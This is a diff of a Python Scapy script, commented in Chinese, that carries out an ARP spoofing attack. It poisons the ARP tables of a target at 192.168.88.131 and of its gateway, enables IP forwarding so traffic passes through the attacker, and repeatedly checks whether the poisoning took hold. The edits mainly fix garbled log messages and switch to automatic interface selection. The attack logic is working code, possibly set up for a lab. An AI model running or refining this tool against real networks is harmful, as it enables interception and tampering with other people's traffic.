@@ -21,10 +21,10 @@ def send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface):
 
 def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
     """恢复 ARP 表"""
-    print("[INFO] FFFAR...")
+    print("[INFO] 恢复 ARP 表...")
     send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3)
     send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3)
-    print("[INFO] ARP")
+    print("[INFO] ARP 恢复完成")
 
 def get_mac(ip):
     """获取目标设备的 MAC 地址"""
@@ -37,7 +37,7 @@ def main():
     # 配置相关信息
     target_ip = "192.168.88.131"  # 替换为目标设备 IP
     gateway_ip = "192.168.88.2"   # 替换为网关 IP
-    iface = "ens33"            # 替换为攻击设备的网卡名称
+    iface = None  # 自动选择网络接口
 
     # 获取 MAC 地址
     attacker_mac = get_if_hwaddr(iface)  # 本机 MAC 地址
@@ -45,18 +45,18 @@ def main():
     gateway_mac = getmacbyip(gateway_ip)  # 网关 MAC 地址
 
     if target_mac is None or gateway_mac is None:
-        print("[ERROR] MAC")
+        print("[ERROR] 无法获取目标或网关的 MAC 地址")
         return
 
-    print(f"[INFO] 1: {target_ip} ({target_mac})")
-    print(f"[INFO] 2: {gateway_ip} ({gateway_mac})")
-    print(f"[INFO] 3: {attacker_mac}")
+    print(f"[INFO] 目标 IP: {target_ip} ({target_mac})")
+    print(f"[INFO] 网关 IP: {gateway_ip} ({gateway_mac})")
+    print(f"[INFO] 攻击者 MAC: {attacker_mac}")
 
     try:
         # 启用 IP 转发
         enable_ip_forwarding()
 
-        print("[INFO] kaishi ARP ...")
+        print("[INFO] 开始 ARP 欺骗攻击 ...")
 
         while True:
             # 持续发送伪造的 ARP 包
@@ -65,14 +65,14 @@ def main():
             # 检查目标设备的 ARP 表是否已经修改
             observed_mac = get_mac(target_ip)
             if observed_mac != gateway_mac:
-                print(f"[INFO]  ARP xuigaicheng: {observed_mac}")
+                print(f"[INFO] ARP 已被篡改: {observed_mac}")
             else:
-                print(f"[INFO]  ARP shibai: {observed_mac}")
+                print(f"[INFO] ARP 未被篡改: {observed_mac}")
 
             time.sleep(2)  # 每隔 2 秒发送一次
 
     except KeyboardInterrupt:
-        print("\n[INFO] error...")
+        print("\n[INFO] 停止攻击...")
         restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
 
     finally:
